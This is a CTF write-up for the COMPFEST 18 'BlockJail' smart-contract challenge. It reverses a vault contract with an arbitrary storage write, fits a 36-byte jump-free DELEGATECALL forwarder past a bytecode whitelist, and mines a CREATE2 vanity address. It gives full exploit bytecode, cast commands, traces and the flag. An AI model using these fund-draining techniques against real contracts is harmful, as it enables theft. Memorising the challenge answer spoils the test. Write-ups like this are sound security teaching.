@@ -1,0 +1,326 @@
+---
+title: 'COMPFEST 18 - BlockJail'
+description: 'Fitting a general DELEGATECALL forwarder into a 36-byte jump-free bytecode whitelist, then abusing a validated arbitrary storage write in a reversed vault'
+date: 2026-08-30
+tags: ['writeup', 'blockchain', 'smart-contracts', 'solidity', 'bytecode', 'delegatecall', 'compfest', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+Two independent puzzles stacked on top of each other: an EVM bytecode-golf problem that forces the attacker contract into 36 jump-free bytes, and a reverse-engineering problem on a vault contract that was never shipped in the handout.
+
+## Challenge Description
+
+> Lets infiltrate the palace again!
+
+The handout is three files:
+
+```text
+BlockJail.sol
+Setup.sol
+foundry.toml
+```
+
+`Setup.sol` imports `./PalaceVault.sol` — a file that **is not in the archive**. So half the target is a black box until an instance is launched.
+
+```solidity
+contract Setup {
+    BlockJail public TARGET;
+    address payable public PALACE;
+
+    constructor() payable {
+        address predictedTarget = _createAddress(address(this), 2);
+        uint256 palaceFunds = msg.value / 2;
+        PalaceVault palace = new PalaceVault{value: palaceFunds}(predictedTarget);
+        PALACE = payable(address(palace));
+        TARGET = new BlockJail{value: msg.value - palaceFunds}(PALACE);
+        if (address(TARGET) != predictedTarget) revert BadPrediction();
+    }
+
+    function isSolved() external view returns (bool) {
+        return TARGET.pathOpened() && address(TARGET).balance == 0
+            && PalaceVault(PALACE).isSolved();
+    }
+}
+```
+
+Each contract is funded with 100 ETH, and the vault is told the jail's address up front via nonce prediction. Three win conditions:
+
+- `TARGET.pathOpened() == true`
+- `TARGET.balance == 0`
+- `PalaceVault.isSolved()` — unknown at this point
+
+## Getting an instance
+
+The launcher is a Next.js frontend over a kctf-style proof-of-work gate. The client-side JS spells the scheme out: a **sloth VDF** over the Mersenne prime `2^1279 - 1`.
+
+```python
+import base64, gmpy2
+
+MODULUS = 2**1279 - 1
+
+def solve(d, x):
+    p = gmpy2.mpz(MODULUS)
+    e = gmpy2.mpz((MODULUS + 1) // 4)     # == 1 << 1277
+    x = gmpy2.mpz(x)
+    for _ in range(d):
+        x = gmpy2.powmod(x, e, p) ^ 1
+    return x
+```
+
+Difficulty is `0x2710` = 10000 iterations, about 10 seconds with `gmpy2`. Then it is just `GET /challenge` → `POST /solution` → `POST /launch` → `GET /flag`, all on one session cookie.
+
+```text
+RPC_URL              http://34.2.147.230:8500/<uuid>
+SETUP_CONTRACT_ADDR  0xd34C3673fB99526473f3A567a0D48bE92ED49Aad
+TARGET  (BlockJail)  0xF4F225e75b8EE34EDD6AEb3bD46610034795Faaa
+PALACE  (PalaceVault) 0xC7F03e88fcEFF69Ab0621FBF1483AB308ff6B816
+```
+
+## Part 1 — Reversing PalaceVault
+
+`cast code` + `cast disassemble` gives ~1700 lines of Solidity-shaped assembly. The dispatcher exposes six selectors; two are guessable immediately:
+
+| selector | function |
+|----------|----------|
+| `0x4b839b2c` | `beginInfiltration(bytes)` |
+| `0x64d98f6e` | `isSolved()` |
+| `0x5323c043` | returns the BlockJail address |
+| `0x8dec43a6` | `bool` at slot 0 |
+| `0xa6939ab2` | `uint256` at slot 1 |
+| `0xae3d0f8b` | `mapping(address => uint256)` at slot 2 |
+
+Reading the bodies gives this storage layout:
+
+| slot | meaning |
+|------|---------|
+| 0 | `bool unlocked` |
+| 1 | reentrancy lock (`0` idle, `1` in progress) |
+| 2 | `mapping(address => uint256) hearts` |
+| 3 | `uint256 stage` |
+| 4–8 | the five card bytes |
+
+### isSolved()
+
+At `0x03f9`:
+
+```solidity
+return unlocked && hearts[JAIL] == 0 && address(this).balance == 0;
+```
+
+On a fresh instance `unlocked == false`, `hearts[JAIL] == 1` and the balance is 100 ETH, so all three have to be flipped.
+
+### beginInfiltration(bytes card)
+
+```text
+0x0170  require(msg.sender == JAIL)                    // else revert 0xd603440c
+0x01f5  require(card.length == 5 && lock == 0)         // else revert 0xab4a5c25
+0x0241  slot4..slot8 = card[0..4]                      // one byte per slot
+0x0312  require(card[0] == 0 && card[1] == 1)
+0x035c  require(card[2] <= 3 && card[3] <= 3 && card[4] <= 3)
+0x03b4  stage = 2
+0x03bc  lock  = 1
+0x03c3  _run()
+0x03cb  lock  = 0
+```
+
+Note `stage` is **forced to 2** before the machine starts. Remember that.
+
+### The dispatch loop
+
+`_run()` at `0x04ac` builds a `function() internal[4]` array and then:
+
+```solidity
+for (uint256 i = 0; i < funcs.length; ++i) {   // exactly 4 iterations
+    uint256 s = stage;
+    if (s == funcs.length) {                   // early exit at stage == 4
+        require(isSolved());
+        return;
+    }
+    require(s <= funcs.length);
+    funcs[s]();                                // <- stage picks the handler
+}
+require(stage == funcs.length);                // must land on 4
+```
+
+The four handlers, in array order:
+
+| idx | address | behaviour |
+|-----|---------|-----------|
+| 0 | `0x0779` | `require(unlocked && hearts[JAIL] == 0)`; `tx.origin.call{value: address(this).balance}("")`; `stage = card[4]` |
+| 1 | `0x08d2` | `stage = 4` — the terminator |
+| 2 | `0x08dc` | **`sstore(card[0], card[1])`**; `stage = card[2]` |
+| 3 | `0x08f8` | `require(unlocked)`; `hearts[JAIL] = 0`; `stage = card[3]` |
+
+### The bug
+
+Handler 2 is an **arbitrary storage write**, and because `stage` is hardcoded to 2 on entry it is *always* the first thing that runs. The input validation even mandates the exact values needed to abuse it:
+
+```text
+require(card[0] == 0 && card[1] == 1)   ->   sstore(0, 1)   ->   unlocked = true
+```
+
+The "card" that is supposedly a fixed protocol handshake is in fact the key that unlocks the vault. From there the remaining three bytes are a little program over the handler table:
+
+```text
+card = 0x00 01 03 00 01
+        │  │  │  │  └── card[4] = 1 -> handler 1: stage = 4   (terminate)
+        │  │  │  └───── card[3] = 0 -> handler 0: drain to tx.origin
+        │  │  └──────── card[2] = 3 -> handler 3: hearts[JAIL] = 0
+        │  └─────────── card[1] = 1 ─┐ sstore(0, 1): unlocked = true
+        └────────────── card[0] = 0 ─┘
+```
+
+Execution trace: `stage 2` → unlock → `stage 3` → clear the heart → `stage 0` → drain 100 ETH to `tx.origin` → `stage 1` → `stage = 4`, loop ends, `stage == funcs.length` holds. All three `isSolved()` conditions satisfied.
+
+Ordering matters: handler 0 requires `hearts[JAIL] == 0`, so the clear must come before the drain; both require `unlocked`, so the `sstore` must come first — which it does, for free.
+
+## Part 2 — Squeezing through the agent filter
+
+Reaching `beginInfiltration` at all means becoming BlockJail's `agent`:
+
+```solidity
+function enter() external {
+    if (agent != address(0) || msg.sender.code.length == 0) revert InvalidAgent();
+    _validateAgentRuntime(msg.sender);
+    agent = msg.sender;
+    beneficiary = tx.origin;
+}
+```
+
+`_validateAgentRuntime` walks the caller's deployed runtime byte by byte and enforces:
+
+- `0 < code.length <= 36`
+- every opcode in the whitelist: `00 STOP`, `36 CALLDATASIZE`, `37 CALLDATACOPY`, `3d RETURNDATASIZE`, `3e RETURNDATACOPY`, `50 POP`, `5a GAS`, `5f PUSH0`, `f3 RETURN`, `f4 DELEGATECALL`, `fd REVERT`, `80–9f DUP/SWAP`, `60–7f PUSHn`
+- exactly one `DELEGATECALL`
+- `hasVanityImplementation`: some `PUSHn` with `n <= 20` whose operand is `<= type(uint144).max` **and** whose value, read as an address, has non-empty code
+- for every push, `i + pushSize < code.length` (a push may not run to the final byte)
+
+Two consequences worth naming:
+
+- **No `JUMP`, `JUMPI` or `JUMPDEST`.** The agent must be straight-line code. No Solidity output, no loops, no success checks — every canned minimal-proxy is out (EIP-1167 is 45 bytes *and* jumps).
+- **`operand <= type(uint144).max`** means the top two bytes of the address must be zero. The delegatecall implementation has to be mined to a `0x0000…` address.
+
+### Fitting in 36 bytes
+
+The natural forwarder is 37 bytes with `PUSH20` and a `POP`. Two savings bring it to exactly 36:
+
+- **`PUSH18` instead of `PUSH20`** (−2 bytes). Since the address needs two leading zero bytes anyway, pushing only the low 18 is equivalent — and an 18-byte operand is `<= 2^144 - 1` *by construction*, so the vanity predicate is satisfied automatically.
+- **Drop the `POP`** of the delegatecall status flag (−1 byte). Nothing branches on it, and `RETURN` does not care about a leftover stack item. Losing the success check is exactly why the exploit tx needs a manual gas limit later.
+
+```text
+36 5f 5f 37                     calldatacopy(0, 0, calldatasize)
+5f 5f 36 5f                     retLen=0, retOff=0, argsLen=calldatasize, argsOff=0
+71 <18-byte impl>               PUSH18 impl        <- vanity operand + call target
+5a f4                           gas ; delegatecall
+3d 5f 5f 3e                     returndatacopy(0, 0, returndatasize)
+3d 5f f3                        return(0, returndatasize)
+```
+
+`4 + 4 + 19 + 2 + 4 + 3 = 36`. One `DELEGATECALL`, one qualifying `PUSH`, the push ends at index 26 of 36, every opcode whitelisted.
+
+Deploy wrapper (10 bytes of init code + the 36-byte body):
+
+```text
+6024 600a 5f 39 6024 5f f3 || <runtime>
+```
+
+### Mining the implementation address
+
+Sixteen bits of vanity against the canonical CREATE2 factory `0x4e59b44847b379578588920cA78FbF26c0B4956C` (predeployed on anvil) — roughly 65k hashes, 0.2 seconds:
+
+```python
+from Crypto.Hash import keccak
+def k(b):
+    h = keccak.new(digest_bits=256); h.update(b); return h.digest()
+
+factory = bytes.fromhex("4e59b44847b379578588920ca78fbf26c0b4956c")
+ih = k(init)                              # keccak of the Impl creation code
+for i in range(1 << 26):
+    salt = i.to_bytes(32, "big")
+    addr = k(b"\xff" + factory + salt + ih)[12:]
+    if addr[0] == 0 and addr[1] == 0:
+        print(salt.hex(), addr.hex()); break
+```
+
+```text
+salt: 0x…2311   ->   impl: 0x00001507f59457622d308da270d0b898b71ffe36
+```
+
+### The implementation
+
+Ordinary Solidity — it runs under `DELEGATECALL`, so `address(this)` is the 36-byte agent and every outbound call originates from it:
+
+```solidity
+interface IJail {
+    function enter() external;
+    function openPath() external;
+    function stealHeart() external;
+    function infiltrate(bytes calldata card) external returns (bytes memory);
+}
+
+contract Impl {
+    function go(address jail, bytes calldata card) external {
+        IJail(jail).enter();          // agent = proxy, beneficiary = tx.origin
+        IJail(jail).openPath();       // pathOpened = true
+        IJail(jail).infiltrate(card); // palace: 100 ETH -> tx.origin
+        IJail(jail).stealHeart();     // jail:   100 ETH -> beneficiary
+    }
+}
+```
+
+`beneficiary` is `tx.origin`, and the palace's drain handler also pays `tx.origin`, so both 100 ETH transfers land on the player EOA with no receive hook needed anywhere.
+
+## Exploitation
+
+```bash
+# 1. Impl at a 0x0000… address, via the canonical CREATE2 factory
+cast send 0x4e59b44847b379578588920cA78FbF26c0B4956C "${SALT}${IMPL_INIT#0x}" \
+  --private-key $PRIVKEY --rpc-url $RPC_URL
+
+# 2. the 36-byte agent
+cast send --private-key $PRIVKEY --rpc-url $RPC_URL --create \
+  0x6024600a5f3960245ff3365f5f375f5f365f711507f59457622d308da270d0b898b71ffe365af43d5f5f3e3d5ff3
+
+# 3. fire — note the explicit gas limit
+cast send $AGENT $(cast calldata "go(address,bytes)" $TARGET 0x0001030001) \
+  --private-key $PRIVKEY --rpc-url $RPC_URL --gas-limit 5000000
+```
+
+### Gotcha: the gas estimate lies
+
+The agent deliberately discards the delegatecall status flag (that was the byte we saved). So when the inner call runs out of gas, the outer frame still returns cleanly. `eth_estimateGas` binary-searches, finds that ~25k gas produces a *successful* transaction, and hands back 25360. The transaction then mines with `status: 0x1` and does absolutely nothing:
+
+```text
+[3484] agent::go(...)
+  ├─ [819] 0x00001507…::go(...) [delegatecall]
+  │   └─ ← [OutOfGas] EvmError: OutOfGas
+  └─ ← [Return]
+```
+
+Passing `--gas-limit` explicitly fixes it:
+
+```text
+[262870] agent::go(0xF4F2…Faaa, 0x0001030001)
+  ├─ [260205] 0x00001507…::go(...) [delegatecall]
+  │   ├─ [67730] BlockJail::enter()
+  │   ├─ [694]   BlockJail::openPath()
+  │   ├─ [179230] BlockJail::infiltrate(0x0001030001)
+  │   │   ├─ [174414] PalaceVault::4b839b2c(…)
+  │   │   │   ├─ [0] player::fallback{value: 100000000000000000000}()
+  │   ├─ [7777] BlockJail::stealHeart()
+  │   │   ├─ [0] player::fallback{value: 100000000000000000000}()
+```
+
+```bash
+$ cast call $SETUP 'isSolved()(bool)' --rpc-url $RPC_URL
+true
+```
+
+A bytecode whitelist is not a sandbox: banning jumps and capping length only constrains the *shape* of the caller, never its behaviour — a straight-line `DELEGATECALL` forwarder is already fully general. The `operand <= type(uint144).max` clause that was meant as an obstacle turns out free (any `PUSH18` satisfies it by definition) and even pays for the byte saving that makes 36 reachable.
+
+## Flag
+
+```text
+COMPFEST18{I_guess_bro_here_is_relatively_secure_mirror_flag_you_have_searched_for_0f95fd47}
+```
